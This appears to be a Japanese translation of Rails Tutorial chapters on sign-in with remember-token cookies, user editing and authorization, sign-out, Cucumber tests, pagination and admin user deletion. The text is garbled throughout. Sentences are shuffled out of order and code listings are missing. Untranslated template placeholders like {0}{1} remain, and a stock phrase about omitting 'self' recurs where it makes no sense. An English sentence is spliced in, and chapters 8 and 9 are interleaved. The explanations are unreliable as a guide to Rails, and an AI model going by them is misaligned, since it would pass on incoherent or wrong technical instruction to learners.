記憶トークンをテストするために、最初にテストユーザーを保存し (これまでは作成されても保存はされていませんでした)、次にユーザーの\kode{remember_token}属性が空欄でないことを確認します。
これにより、必要が生じたときにランダム文字列を変更するのに十分な柔軟性が得られます。
最大の違いは、ユーザー登録は誰でも実行できますが、ユーザー情報を更新できるのはそのユーザー自身に限られるということです。
作成したコードをリスト\ref{code:remember_token_should_not_be_blank}に示します
記憶トークンが有効である (空欄のない) ことをテストする。
最初に、Gravatar画像を変更するリンクに注目してください。GravatarのWebサイトを探してみると、\href{http://gravatar.com/emails}{http://gravatar.com/emails}に画像の追加と編集を行えるページがありましたので、\kode{edit}ページ上のこのURL{p2}へのリンクについて テストを行なうことにします。
Gravatarサイトにアクセスすると、実際には\href{http://en.gravatar.com/emails}{http://en.gravatar.com/emails}にリダイレクトされます。ここは英語ユーザー向けですが、他の言語を考慮し、\texttt{en}をURLに含めませんでした。
{0}図9.1{/0}{1}ユーザー編集ページのモックアップ。\href{http://railstutorial.org/images/figures/edit_user_mockup_bootstrap-full.png}{(拡大)}{/1}
作成したコードをリスト\ref{code:user_edit_specs}に示します
ユーザー編集ページのテスト。
上のコードは\emph{メソッド参照}と呼ばれるもので、こうすることでRailsは\kode{create_remember_token}というメソッドを探し、ユーザーを保存する前に実行するようになります
次に、このメソッド自身はUserモデルの内部でしか使用しないので、外部のユーザーがアクセスできるようにする必要はありません。
これに対応するアプリケーションコードは、Usersコントローラの\kode{edit}アクションの中に書き込みます。
ユーザーのidは\kode{params[:id]}変数で取り出すことができるのを思い出してください。つまり、リスト\ref{code:initial_edit_action}のコードを使えばそのユーザーを指定できるということです。
このため、上をコンソールで実行すると\kode{NoMethodError}例外が発生します。
最後に、\kode{create_remember_token}メソッドは、ユーザーの属性のひとつに「\emph{要素代入 (assignment)}」する必要があります。この文脈から、\kode{remember_token}の前に\kode{self}キーワードを追加する必要があります。
上のコードに\kode{self}というキーワードがないと、要素代入によって\kode{remember_token}という名前の\emph{ローカル}変数が作成されてしまうので、注意が必要です (ここで本来必要なのはローカル変数ではなく、インスタンス変数です)。この動作は、Rubyにおけるオブジェクト内部への要素代入の仕様によるものです。
\kode{self}キーワードを与えることで、要素代入は正しくそのユーザーの\kode{remember_token}属性を設定するようになり、その結果ユーザーが保存されるときに他の属性と一緒にこの属性もデータベースに保存されます
(\emph{to_s}メソッドを呼び出しているのは、\kode{nil}トークンを扱えるようにするためです。ブラウザでnilトークンが発生することはあってはなりませんが、テスト中に発生することはありえるためです)。
これはリスト\ref{code:before_create_remember_token}で使用されていました。
\kode{before_create}コールバックを使用して\kode{remember_token}属性を作成する。
ちなみに、\kode{private}キーワード以降のコードは、強調のため\kode{create_remember_token}のインデントを1段深くしてあります
(経験上、こうしておくことをお勧めします)。
仕上げに、ユーザー設定のリンクにURLを1つ追加してサイト内を移動できるようにします。
いよいよ、最初のサインイン要素である\kode{sign_in}関数自身の実装に取りかかりましょう。
selfを省略した結果をリスト\ref{code:settings_link_test}に示します。
[Settings] リンクのテストを追加する。
作成したコードをリスト\ref{code:sign_in_function}に示します
完全だがまだ動作しない\kode{sign_in}関数。
selfを省略した結果をリスト\ref{code:sign_in_helper}に示します。
ユーザーがサインインするためのテストヘルパー。
# Capybaraを使用していない場合にもサインインする。
cookiesの各要素は、それ自体が2つの要素 (\kode{value}とオプションの\kode{expires}日時) のハッシュになっています。
たとえば以下のように、cookiesに20年後に期限切れになる記憶トークンに等しい値を保存することで、ユーザーのサインインを実装できます。
コメント行にも書いてあるとおり、Capybaraを使用していないとフォームへの自動入力が動作しません。このような場合に備えて、ユーザーから\kode{no_capyabara: true}オプションを渡せるようにし、デフォルトのサインインメソッドを上書きしてcookiesを直接操作できるようにします。ユーザー情報記憶用のトークンをcookies (クッキー) に保存しておきます。As noted in the comment line, filling in the form doesn’t work when not using Capybara, so to cover this case we allow the user to pass the option \kode{no_capyabara: true} to override the default signin method and manipulate the cookies directly.
  => Sun, 13 Mar 2011 03:38:55 UTC +00:00
これはリスト\ref{code:delete_destroy_test}で使用されていました。
  => Sat, 02 Jan 2010 03:39:14 UTC +00:00
[Settings] リンクを追加する。
上のように20年で期限切れになるcookies設定はよく使われるようになり、今ではRailsにも特殊な\kode{permanent}という専用のメソッドが追加されたほどです。このメソッドを使用すると、コードは以下のようにシンプルになります。
後で使うために記憶トークンをcookiesに保存する方法の説明が終わりましたので、今度は移動先のページでユーザーを取り出す方法について学びましょう。
\kode{sign_in}関数のコードをもういちどよく見てみてください。
現時点では、上のコードのうち、以下のコードだけが動作していません。
selfを省略した結果をリスト\ref{code:user_update_action_unsuccessful}に示します。
\kode{current_user}のコードを書く上で、以下の行については注意が必要です。
無効な情報が送信された場合、更新の結果として\kode{false}が返され、\kode{else}に分岐して編集ページを再度レンダリングします。
上は「\emph{要素代入 (assignment)}」であることに注意してください。このcurrent_user=は別途定義が必要です。
これはリスト\ref{code:current_user_equals}で使用されていました。
\kode{current_user}への要素代入を定義する。
上のコードで使用されている特殊な文法は混乱しやすいので注意してください。普通のプログラミング言語では、定義するメソッドの名前に等号を使用することはできませんが、Rubyではメソッド名末尾の等号には特殊な意味があり、上のコードは\kode{current_user}への要素代入を扱うように設計された\kode{current_user=}というメソッドを単に定義します。
そして最終的に\kode{current_user=}というメソッドが呼び出されます。
{0}図9.3{/0}{1}更新フォームの送信で発生したエラーメッセージ。\href{http://railstutorial.org/images/figures/edit_with_invalid_information_bootstrap-full.png}{(拡大)}{/1}
{0}図9.4{/0}{1}\href{http://gravatar.com/}{Gravatar}の画像調整インターフェイス (写真は\href{http://michaelhartl.com/}{誰かさん}){/1}。
その引数は要素代入の右側にひとつ置かれます (ここではサインインするユーザー)。
\kode{update}アクションのテストも、\kode{create}アクション用のテストとだいたい同じです。
この一行メソッドは、単に\kode{@current_user}インスタンス変数を設定し、後に使用するためにユーザーを効率よく保存します。
selfを省略した結果をリスト\ref{code:current_user_wrong}に示します。
ユーザー\kode{update}アクションのテスト。
つい使ってみたくなるが実際には役に立たない\kode{current_user}の定義
この行は使用しないこと。
実は、この2つは完全に同等です。\kode{attr_accessor}は、単にゲッターメソッドやセッターメソッドを自動的に作成する便利な方法でしかありません。
リスト\ref{code:sign_in_helper}のとき
これにより、\kode{user.reload}を使用してテストデータベースから\kode{user}変数に再度読み込みが行われ、ユーザーの新しい名前とメールアドレスが新しい値と一致するかどうかが確認されます。
テストにパスする必要のある、リスト{p0}の{2}update{/2}アクションは、リスト\ref{code:signin_upon_signup}に示したように、{2}create{/2}アクション (リスト\ref{code:user_update_action}) の最終的なフォームとほぼ同じです。
selfを省略した結果をリスト\ref{code:current_user_working}に示します。
変更すべき点は、以下を
これはリスト\ref{code:user_update_action_unsuccessful}で使用されていました。
\kode{remember_token}を使用して現在のユーザーを検索する。
この代入演算子は、\kode{@current_user}が未定義の場合にのみ、\kode{@current_user}インスタンス変数に記憶トークンを設定します
この節のコードを使用することで、ユーザー編集ページは動作するはずです。テストスイートをもう一度実行してみると、今度は緑色になるでしょう。
通常、これは初期値が\kode{nil}である変数への代入を意味しますが、\kode{false}値も\kode{||=}演算子によって上書きされることに注意してください。
つまり、以下のコードは
あるユーザーに対して\kode{current_user}が初めて呼び出される場合は\kode{find_by}メソッドを呼び出しますが、以後の呼び出しではデータベースにアクセスせずに\kode{@current_user}を返します
このコードは、ひとつのユーザーリクエストに対して\kode{current_user}が何度も使用される場合にのみ有用です。いずれの場合も、ユーザーがWebサイトにアクセスすると\kode{find_by}は最低1回は呼び出されます。
この節では、ユーザーにサインインを要求し、かつ自分以外のユーザー情報を変更できないようにするセキュリティモデルを構築しましょう。
\texttt{||=}という記法は非常にRuby的であり、Rubyという言語を強く特徴づけるものです。Rubyプログラミングの達人になりたいのであれば、この記法を習得することが重要です。
保護されたページにアクセスしたときのページのモックアップ。\href{http://railstutorial.org/images/figures/signin_page_protected_mockup_bootstrap-full.png}{(拡大)}
\emph{or equals}という概念は一見神妙不可思議に見えますが、他のものになぞらえて考えることで理解できます。
\kode{edit}アクションと\kode{update}アクションのセキュリティ制限はまったく同じなので、これらを共通のRSpec \kode{describe}ブロックで扱うことにします。
最初は、現在定義されている変数を変更するというありふれたコードについて説明します。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
\kode{edit}アクションと\kode{update}アクションが保護されているかどうかテストする。
多くのコンピュータプログラムでは、以下のようにして変数の値を1つ増やすことができます。
そして、Ruby (C、C++、Perl、Python、Java) などの多くのプログラミング言語では、以下のような短縮形を使用して上の演算を行うことができます。
  >> x = 1
  => 1
  >> x += 1
  => 2
  >> x *= 3
  => 6
なぜこんなことをするかというと、ブラウザは\kode{update}アクションを直接表示することができないからです。ブラウザは、編集フォームを送信することで間接的にそのアクションに到達することしかできないので (訳注: updateは純粋に更新処理を行うアクションであって、そこで何かを表示するわけではないので)、Capybaraでは対応できません。
  >> x -= 7
  => -1
そして、editページを表示しても\kode{edit}アクションの認可テストはできますが、\kode{update}アクションの認可テストはできません。
こうした事情から、\kode{update}アクション自体をテストするにはリクエストを直接発行する以外に方法がありません (
\kode{patch}メソッドがあることからわかるように、Railsのテストでは\kode{get}、\kode{post}、\kode{delete}メソッドもサポートされています)。
これらのメソッドのいずれかを使用してHTTPリクエストを直接発行すると、低レベルの\kode{response}オブジェクトにアクセスできるようになります。
  >> @user
Capybaraの\kode{page}オブジェクトと異なり、 \kode{response}オブジェクトはサーバーの応答自体のテストに使用できます。 この場合は、サインインページへのリダイレクトによる\kode{update}アクションの応答を確認します。
  => nil
  >> @user = @user || "the user"
selfを省略した結果をリスト\ref{code:authorize_before_filter}に示します。
  => "the user"
  >> @user = @user || "another user"
before_filterに\kode{signed_in_user}を追加する。
\texttt{nil}の論理値は偽 (false) です。初めて代入するときは「\texttt{nil || "the user"}」となり、これは「\texttt{"the user"}」と評価されます。同様に、2度目の代入では「\texttt{"the user" || "another user"}」となり、これも「\texttt{"the user"}」と評価されます。あらゆる文字列の論理値は真 (\texttt{true}) なので、 \texttt{||}を使用する一連の式は、いずれも1番目の式が評価された時点で終了します
上述した多くの演算子をコンソールセッション上で実行して比較してみると、\texttt{@user = @user || value}は「\texttt{x = x O y}」のパターンに該当し、\texttt{O}が\texttt{||}に置き換わっただけのものであることがわかります。ということは、この演算は以下と同じであることが推測できます。
  >> @user ||= "the user"
サインイン/サインアウトが動作するようになり、実用的なアプリケーションらしくなってきました。今度は、サインインの状態に合わせてレイアウト上のリンクが変わるようにしましょう。
サイトレイアウトのリンクを変更するには、埋め込みRubyの内側でif-else分岐構造を使用します。
  # サインインしているユーザー用のリンク
  #サインインしていないユーザー用のリンク
この種のコードでは、\kode{signed_in?} 論理値が必要になりますので、これから定義しましょう。
ユーザーがサインインしている状態は、セッションに現在のユーザーがいる (\kode{current_user}が\kode{nil}でない) ことで表されます。
{0}図9.6{/0}{1}保護されたページにアクセスした直後のサインインフォーム。\href{http://railstutorial.org/images/figures/protected_sign_in_bootstrap-full.png}{(拡大)}{/1}
これを表現するには否定の演算子が必要なので、\kode{!} ("bang" と読みます) を使用します。
selfを省略した結果をリスト\ref{code:signed_in_p}に示します。
当然のことですが、サインインを要求するだけでは十分ではありません。ユーザーが\emph{自分自身の}情報以外の他ユーザーの情報を編集できないようにする必要もあります。
\kode{edit}アクションと\kode{update}アクションで正しいユーザーを要求することをテストする。
\kode{signed_in?}メソッドを手作りしてあるので、レイアウトのリンクはすぐに作成できます。
Railsでは、このユーザーへの直接リンクが許されるので、この場合\kode{current_user}は\kode{user_path(current_user)}に自動的に変換されます。
新しいリンクをレイアウトに追加するときに、Bootstrapの機能を使用してドロップダウンメニューを実現しましょう。詳細については「\href{http://getbootstrap.com/2.3.2/components.html}{Bootstrapコンポーネント} (英語)」を参照してください。
なお、ファクトリーでは以下のオプションを使用できます。
これはリスト\ref{code:layout_signin_signout_links}で使用されていました。
上のコードは、作成するユーザーのメールアドレスをデフォルトと異なるものに変更します。
このコードでは、Bootstrapのドロップダウンメニューに関連するCSSのidとクラスが与えられていることに注目してください。
このテストでは、元のユーザーが別のユーザーの\kode{edit}アクションや\kode{update}アクションにアクセスできないことを確認します。
サインインしているユーザー用にリンクを変更する。
このコードは\kode{update}アクションでも同様でした。
しかし既に\kode{correct_user} before_filterで\kode{@user}を定義したので、updateアクションとeditアクションからこのコードを削除できました。
以下を実行してテストスイートがパスすることを確認してから先に進むことにしましょう。
{0}図8.9{/0}{1}サインインしたユーザーにリンクとドロップダウンが表示されるようになった。\href{http://railstutorial.org/images/figures/profile_with_signout_link_bootstrap-full.png}{(拡大)}{/1}
この時点で、ブラウザで実際にサインインできることを確認し、続いてブラウザを閉じてから再度サンプルアプリケーションを表示するとサインインしたままになっていることを確認してください。
別の言い方をすれば、ログオンしていないユーザーが編集ページにアクセスしようとしていたなら、ユーザーがサインインした後にはその編集ページにリダイレクトされるようにするのが望ましい動作です。
{0}図8.10{/0}{1}ローカルのブラウザで記憶トークンのcookiesを表示する。\href{http://railstutorial.org/images/figures/cookie_in_browser-full.png}{(拡大)}{/1}
このような動作を “フレンドリーフォワーディング” と呼びますが、これをテストするには次のような手順を踏みます。まずユーザーのeditページにアクセスし、その後サインインページにリダイレクトします。
認証機能の基本的な部分はできましたが、ユーザーが登録を行った後、そのユーザーがデフォルトではサインインしておらず、このままではユーザーが混乱する可能性があります。
そこで、サインアウトの機能を実装する前にその部分をもう少し作り込みましょう。
それから正しいサインイン情報を入力し、[Sign in] ボタンをクリックします。
サインイン後にリダイレクトされるのはユーザーのプロファイルページですが、この場合はもともと "Edit user" ページにアクセスしようとしていたのですから、そのページにリダイレクトするようにします。
これはリスト\ref{code:friendly_forwarding_test}で使用されていました。
新規ユーザー登録後にユーザーがサインインしたことをテストする。
上のコードでは、ユーザー登録後にサインインしていることを確認するために、サインアウト用のリンクが表示されているかどうかをテストしています。
いよいよ実装です
ユーザー登録後にサインアップする。
ユーザーを希望のページに転送するには、リクエスト時点のページをどこかに保存しておき、その場所にリダイレクトさせる必要があります。
この節では、そのサインアウト機能を追加します。
Sessionsコントローラのアクションは、これまでもRESTful慣例に従ってサインインページには\kode{new}を使用し、サインインの完了には\kode{create}を使用しました。
今回も同様に慣例に従い、セッションの削除 (サインアウト) には\kode{destroy}を使用します。
ユーザーのサインアウトをテストする。
\kode{store_location}メソッドを、サインインしたユーザーのbefore_filterに追加する。
セッションを削除する (ユーザーのサインアウト)。
sign_out
他の認証用機能と同様に、\kode{sign_out}もSessionsヘルパーモジュールの中に置きます。
Sessionsヘルパーモジュールの\kode{sign_out}メソッド。
これはリスト\ref{code:friendly_session_create}で使用されていました。
これでユーザー登録/サインイン/サインアウトがすべて揃いました。テストスイートはパスするはずです。
いつものように、以下を実行してテストスイートが緑色 (成功) になることを確認してから先に進みましょう。
本書のテストスイートは認証システムをほぼカバーしていますが、すべてをカバーしているわけではありません。この点をご了承ください。
たとえば、[このアカウント設定を保存する] の cookies (remember me) が有効になっているか、その後も保持されているかどうかのテストは含まれていません。
このテストは作成可能ですが、著者の経験上、cookiesの値を直接調べる方法はRailsの実装に左右されやすい傾向があり、次のバージョンのRailsではまた変わるかもしれません。
その際、データベースにサンプルデータを追加する方法や、将来ユーザー数が膨大になってもindexページを問題なく表示できるようにするためのユーザー出力の\emph{ページネーション (pagination=ページ分割)} の方法を学びます。
その場合、アプリケーションコードは正常に動作してもテストが正常に動作しなくなります。
このような理由で、本書のテストコードでは、コアとなるアプリケーションコードをテストする際に高度な機能 (ユーザーがサインインできること、ページ移動後もサインインしていること、サインアウトできること) に重点を置き、重要性の低い機能は必ずしも含んでいません。
サンプルアプリケーションの認証システムの基礎部分が無事完成したので、この機会に\href{http://cukes.info}{Cucumber}を使用したサインインのテスト方法をご紹介します。Cucumberは振舞駆動開発用のツールとして有名で、Rubyコミュニティに多くの愛用者がいます。
{0}図9.7{/0}{1}ページネーションと [Users] リンクを実装したユーザーのインデックスページのモックアップ。\href{http://railstutorial.org/images/figures/user_index_mockup_bootstrap-full.png}{(拡大)}{/1}
ユーザーの\kode{show}ページについては、今後も (サインインしているかどうかにかかわらず) サイトを訪れたすべてのユーザーから見えるようにしておきますが、ユーザー\kode{index}ページはサインインしたユーザーにしか見せないようにし、未登録のユーザーがデフォルトで表示できるページを制限します。
この節の内容は必須ではありませんので、スキップしても問題ありません。
Cucumberを使用すると、アプリケーションの振る舞いをテキストベースの「\emph{ストーリー}」で定義することができます。
selfを省略した結果をリスト\ref{code:protected_index_test}に示します。
多くのRailsプログラマーは、Cucumberは顧客と共同作業するときに便利であることを知っています。Cucumberのストーリーは、専門知識のない人でも読むことができ、ストーリーを顧客と共有したり、場合によっては顧客がストーリーを作成することすらできるためです。
\kode{index}アクションが保護されていることをテストする。
もちろん、テスティングのフレームワークが純粋なRubyでないという点は残念でもあり、著者にとってはテキストベースのストーリーはいささか冗長な面もあると思われます。
それでもCucumberはRubyのテスティングツールキットとして確固たる地位を占めており、著者としては低レベルの実装を気にすることなく高度な振る舞いを記述できる点が特に気に入っています。
本書ではRSpecとCapybaraをテスティングのメインに据えているので、この節のCucumberに関する説明は完全ではなく、表面的で物足りないことでしょう。
この節の目的はCucumberのおいしさ (間違いなくシャキシャキして汁気たっぷりです) を知ってもらうための、いわば試食です。もし気に入っていただけたら、テスティングツールに関する完結した書籍がいくつもあります。
\texttt{cucumber-rails} gemを\kode{Gemfile}に追加する。
selfを省略した結果をリスト\ref{code:signed_in_user_index}に示します。
\kode{index}アクションでユーザーのサインインを要求する。
アプリケーションでCucumberを使用するための設定を行うために、次は必要なサポート用ファイルとディレクトリを生成します。
上のコマンドにより、Cucumber関連のファイルが置かれる\kode{features/}ディレクトリが作成されます。
次の一連のテストでは、サインインしたユーザーから見たインデックスページに、タイトルとコンテンツとサイトのすべてのユーザーが正しく表示されていることを確認します。
Cucumberでは、\href{https://github.com/cucumber/gherkin}{Gherkin} (キュウリ属の植物: ガーキン) と呼ばれるテキストベースの言語を使用して、アプリケーションに期待される振る舞いを記述します。
このメソッドでは、3つのファクトリーユーザー (最初の1人としてサインインします) を作成し、インデックスページに表示されているそれぞれのユーザーにリスト要素 (\kode{li}) タグが与えられていることを確認します。
Gherkinで書かれたテストは、ちゃんと書かれたRSpecの例と同じぐらい読みやすくできています。どちらもテキストベースであり、自然な英語に近くRubyコードよりも読みやすいためです。
selfを省略した結果をリスト\ref{code:user_index_tests}に示します。
このコードはリスト\ref{code:initial_failing_signin_test}で使用されていました。もうひとつ、
ユーザーのインデックスページのテスト。
最初に、\kode{features/}ディレクトリ内に\kode{signing_in.feature}というファイルを作成します。
Cucumberのフィーチャーファイルは、以下のようにその機能の簡単な説明から始まります。
次に個別の\emph{シナリオ}を追加します。
たとえば、サインイン失敗をテストするには、以下のようなシナリオを作成します。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
同様に、サインイン成功をテストするために以下を使用できます。
これはリスト\ref{code:signin_features}で使用されていました。
ユーザーのサインインをテストするCucumberのフィーチャーファイル。
実際のインデックスページを作成するには、ユーザーを列挙してユーザーごとに\kode{li}タグで囲むビューを作成する必要があります。
これらのフィーチャーを実行するには、\kode{cucumber}実行ファイルを以下のように実行します。
リスト\ref{code:user_index_view}では、\ref{code:gravatar_option}の演習のリスト\ref{sec:signup_exercises}の結果を利用しています。これは、Gravatarヘルパーにデフォルト以外のサイズを指定するオプションを渡します。
ここからおわかりだと思いますが、CucumberはRSpecと同様Rakeタスクから呼び出すこともできます。
(\kode{rake cucumber:ok}と書くこともできます)。
まだテキストを書いただけなので、当然ながらこのままではCucumberのシナリオはテストにパスしません。
テストスイートが緑色 (成功) になるためには、テキストファイルをRubyコードにマップする\emph{ステップ}ファイルを作成します。
ステップファイルは\kode{features/step_definitions}ディレクトリに置きます。ファイル名はここでは\kode{authentication_steps.rb}とします。
[Users] リンク用のURL。
\kode{Feature}行と\kode{Scenario}行は説明のためのものですが、それ以外の行はRubyに対応付けられる必要があります。
たとえば、フィーチャーファイルにある以下のコードは、
以下のステップ定義によって扱われます。
フィーチャーファイルの中では\kode{Given}は単なる文字列ですが、ステップファイルの中では\kode{Given}は\emph{メソッド}であり、正規表現とブロックを引数に取ります。
この正規表現はシナリオの中の行とマッチし、次のブロックの内容は、そのステップを実装するために必要なRubyのコードです。
この場合、“a user visits the signin page”という記述は以下のコードによって実装されます。
上のコードはどこかで見たことがあると思ったら、それもそのはず、Capybaraです。CapybaraはデフォルトでCucumberのステップファイルに含まれます。
次の2行もわかりやすいと思います。
上のフィーチャーファイルのコードは、ステップファイルでは以下のように扱われます。
最初のステップでもCapybaraが使用されていますが、その次のステップではCapybaraの\kode{page}オブジェクトとRSpecが併用されています。見てのとおり、RSpecとCapybaraで行えるテストは、すべてCucumberでも行えます。
残りのステップも同様に進められます。
これはリスト\ref{code:authentication_steps}で使用されていました。
ステップを追加したら、以下を実行します。
以上でユーザーインデックスページは完全に機能するようになりましたので、以下のテストはすべてパスするはずです。
テストにパスするまでこれを繰り返します。
サインインフィーチャーがパスするための完全なステップ定義。
{0}図9.8{/0}{1}ユーザーインデックスページ\href{http://localhost:3000/users}{/users}にユーザーが1人しか表示されていない。\href{http://railstutorial.org/images/figures/user_index_only_one_bootstrap-full.png}{(拡大)}{/1}
簡単なCucumberのシナリオをいくつか紹介したので、それらと同等のRSpecの例と比較してみましょう。
このコードはリスト\ref{code:signin_features}で使用されていました。もうひとつ、
次に、サンプルユーザーを作成するRakeタスクを追加します。
次に、以下のRSpecリクエストspec (結合テスト) を見てみましょう。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
(ここは若干高度な内容ですが、今は詳細を理解する必要はありません)。
データベースにサンプルユーザーを追加するRakeタスク。
Cucumberと結合テストでそれぞれどのように実装されているかがおわかりいただけると思います。
Cucumberのフィーチャーは非常に読みやすいのですが、その代わり実装されているコードから完全に切り離されていて、両刃の剣です。
著者にとって、Cucumberは読みやすいが書くのは面倒、結合テストはプログラマーにとってはそれほど読みやすくない代わりに書くのは\emph{はるかに}楽、という印象です。
Cucumberではフィーチャーとステップが分離されていることにより、抽象度の高い記述が可能であるという効果があります。
このコードは\kode{db:populate}タスクを定義します。このタスクは、それらしい名前とメールアドレスを持つ99のユーザーを作成し、従来のユーザーと置き換えます。
\kode{User.create!}を実行する前に、RakeタスクがUserモデルなどのローカルのRails環境にアクセスできるようにします。
こうしておくとより多くのメッセージを生成でき、サイレントエラーを回避できるのでデバッグが容易になります。
以下のフィーチャーは、エラーメッセージが表示されるはずであるということを記述しています。
そして以下のステップファイルでは、このテストを実装しています。
これが特に便利なのは、実装に依存するのが2番目の要素であるステップファイルだけである点です。そのため、たとえばエラーメッセージを表示するためのCSSを変更しても、フィーチャーファイルは変更不要です。
(最初のいくつかのサンプルアドレスについては、デフォルトのGravatar画像以外の写真を関連付けてみました)。
同様に、以下のようなコードを何度も書くのは多くの人にとって苦痛だと思います。
{0}図9.9{/0}{1}ユーザーインデックスページ\href{http://localhost:3000/users}{/users}に100人のサンプルユーザーが表示されている。\href{http://railstutorial.org/images/figures/user_index_all_bootstrap-full.png}{(拡大)}{/1}
本当に行いたいのは、そのページでエラーメッセージが表示されることを示すことのはずです。
しかも、上の記法は実装に密着しているので、実装が変更されたらそれらもすべて変更が必要になります。
純粋なRSpecでは、\emph{カスタムマッチャー}を使用してこの問題を解決することができます。カスタムマッチャーを使用すると、上のコードを以下のように簡潔に記述することができます。
コード自体は以下のようになります。
同様に、よく使われる操作をヘルパーメソッドとして定義することもできます。
この方法は、Cucumberのステップ定義よりも柔軟であることがわかってきました。特に、マッチャーやshouldヘルパーが\kode{valid_signin(user)}のように引数を自然に取ることができます。
\texttt{will_paginate} gemは広く使用されていて実績もあるので、徹底的にテストする必要はありません。ここでは簡単なテストを行うことにします。
ステップ定義は正規表現マッチャーによって繰り返すことができますが、この手法は一般に厄介なものになりやすいという印象です。
最初に、\kode{div}タグのCSS class が “pagination”になっていることをテストします。これは\texttt{will_paginate}によって出力されます。
ヘルパーメソッドとカスタムRSpecマッチャーを追加する。
次に、結果の最初のページに正しいユーザーが表示されていることを確認します。
そのためには\kode{paginate}メソッドが必要です。このメソッドについてはこの後説明します。
テストとサイトの実装を結びつける方法の例は他にも多数あります。
以前と同様、Factory Girlを使用してユーザーをシミュレートすることにしますが、ここで早くも問題が生じます。ユーザーのメールアドレスは一意でないといけませんが、このままだと手作業で30人ものメールアドレスを作成しなければなりません。
それに、ユーザー名もすべて異なるものにしておく方がテストの際に便利です。
本章では多くの分野をカバーし、約束どおり、かつて未成熟だったアプリケーションを、ユーザー登録とログインをフル装備したWebサイトに変身させました。
幸い、この問題はFactory Girlの\emph{sequences}メソッドを使用して解決できます。
認証機能を完成させるためには、サインインの状態とユーザーidに基いてページのアクセスに制限を与える必要もあります。
次にリモートのGitHubリポジトリとHerokuの本番サーバーにプッシュします。
\kode{form_for}の代わりに\kode{form_tag}を使用して、サインインフォームをリファクタリングしてください。
これに代えて、以下のように\kode{sequence}メソッドを使用して一連の名前とメールアドレスを列挙します。
テストスイートが以前と同様にパスすることも確認してください。
\kode{sequence}メソッドの引数には、使用したい属性に対応するシンボル (\kode{:name} など) を使用し、\kode{n}という変数を持つブロックを1つ置きます。
\emph{ヒント}: RailsCastの「\href{http://railscasts.com/episodes/270-authentication-in-rails-3-1}{Rails 3.1における認証} (英語)」を参照してください。特に、\kode{params}ハッシュの構造の変更に注目してください。
続いて\kode{FactoryGirl}メソッドを実行します。
\emph{課外活動:} サポートコードを独立したファイルとモジュールに再編成し、specヘルパーファイルでそれらのモジュールを適切にインクルードしてすべて動作するようにしてください。
これはリスト\ref{code:factory_sequence}で使用されていました。
Factory Girlでシーケンスを定義する。
ファクトリーのシーケンスという考えを応用して、テスト用に30人のユーザーを作成します。ページネーションを行うにはこれで十分です。
ここで\kode{before(:all)}を使用して、ブロックにあるすべてのテストの前にサンプルユーザーを\emph{一括}作成するようにしていることに注目してください。
これは、ユーザーを30人も作成するとシステムによっては速度が低下することがあり、それを防ぐためのものです。
これと対になる\kode{after(:all)}を使用して、完了後ユーザーをすべて削除します。
これはリスト\ref{code:will_paginate_test}で使用されていました。
ページネーションのテスト。
{0}図9.10{/0}{1}ユーザーインデックスページ \href{http://localhost:3000/users}{/users}でのページネーション。\href{http://railstutorial.org/images/figures/user_index_pagination_rails_3_bootstrap-full.png}{(拡大)}{/1}
テストもパスするはずです。
インデックスビューで最初のリファクタリングを行う。
これに限らず、リファクタリングを行う場合には、アプリケーションのコードを変更する前と後で必ずテストを実行し、いずれも緑色 (成功) になることを確認するようにしてください。
しかしその前に、削除を実行できる権限を持つ管理ユーザーのクラスを作成しましょう。
{0}図9.12{/0}{1}削除リンクを追加したユーザーインデックスのモックアップ。\href{http://railstutorial.org/images/figures/user_index_delete_links_mockup_bootstrap-full.png}{(拡大)}{/1}
特権を持つ管理ユーザーを識別するために、論理値をとる\kode{admin}属性をUserモデルに追加します。この後で説明しますが、こうすると自動的に\kode{admin?}メソッド (論理値を返す) も使えるようになりますので、これを使用して管理ユーザーの状態をテストできます。
これはリスト\ref{code:admin_specs}で使用されていました。
\kode{admin}属性に対するテスト。
また、以下の行にも注目してください。
これはユーザーに対して\kode{admin?}メソッド (論理値を返す) が使用できる必要があることを (RSpecの論理値慣習に基いて) 示しています。
これで、adminテストはパスするはずです。
サンプルデータ生成コードに管理者を1人追加する
次にデータベースをリセットし、サンプルデータを再度生成します。
削除機能をテストするには、管理者を作成するファクトリーがあると便利です。
selfを省略した結果をリスト\ref{code:admin_factory}に示します。
管理ユーザー向けのファクトリーを追加する。
私たちのセキュリティモデルでは、一般ユーザーにはこの削除リンクを表示しないようにします。
逆に管理ユーザーにはこの削除リンクが表示され、このリンクをクリックすることでそのユーザーが管理ユーザーによって削除され、\kode{User}カウントが\kode{-1}だけ変わることが期待されます。
上のコードには\kode{match: :first}という記述があります。これは、\emph{どの}削除リンクをクリックするかは問わないことをCapybaraに伝えます。これによりCapybaraは、最初に見つけたリンクを単にクリックするようになります。
このテストには、管理者自身を削除するためのリンクが管理者に表示されていないことを確認するテストも含まれていることに注意してください。
これはリスト\ref{code:delete_link_tests}で使用されていました。
削除リンクのテスト。
{0}図9.14{/0}{1}ユーザーインデックス\href{http://localhost:3000/users}{/users}に削除リンクが表示されている。\href{http://railstutorial.org/images/figures/index_delete_links_rails_3_bootstrap-full.png}{(拡大)}{/1}
なお、このとき、\kode{:destroy} も \kode{signed_in_user} の before_action に追加しています。
サイトを正しく防衛するには、\kode{destroy}アクションにもアクセス制御を行う必要があります。そこで、管理者はユーザーを削除\emph{できる}が一般ユーザーは\emph{できない}ことをテストで確認しましょう。
変更の結果をリスト\ref{code:delete_destroy_test}に示します。
\kode{destroy}アクションの保護のテスト。
原則に従えば、ここにはまだ小さなセキュリティホールが残っています。管理者がやろうと思えば、\texttt{DELETE}リクエストをコマンドラインで直接発行して自分自身を削除できてしまいます。
このアプリケーションコードではbefore_filterを使用していますが、ここでは\kode{destroy}アクションから管理者へのアクセスを制限するのに使用していることに気付いた方もいるかもしれません。
ここまでくれば、すべてのテストはパスするはずです。そしてUsersリソースとUsersコントローラ、Userモデル、Usersビューも今や完全に動作します。
あの頃はユーザー登録すらありませんでしたが、今は登録もサインインもサインアウトもできます。プロファイルの表示も、設定の編集も、すべてのユーザーのインデックスページもあります。一部のユーザーは他のユーザーを削除することすらできるようになりました。
これらの章では、\kode{has_many}や\kode{has_many through}を使用したデータモデルなど、Railsの最も強力な機能をいくつも紹介します。
(システム環境に依存する可能性のあるgemはコメントアウトされています。
自分の環境で動作するのであれば、それらのgemの行をコメント解除しても構いません。)
# The following optional lines are part of the advanced setup.
# gem 'guard-rspec', '2.5.0'
# gem 'guard-spork', '1.5.0'
# gem 'childprocess', '0.3.6'
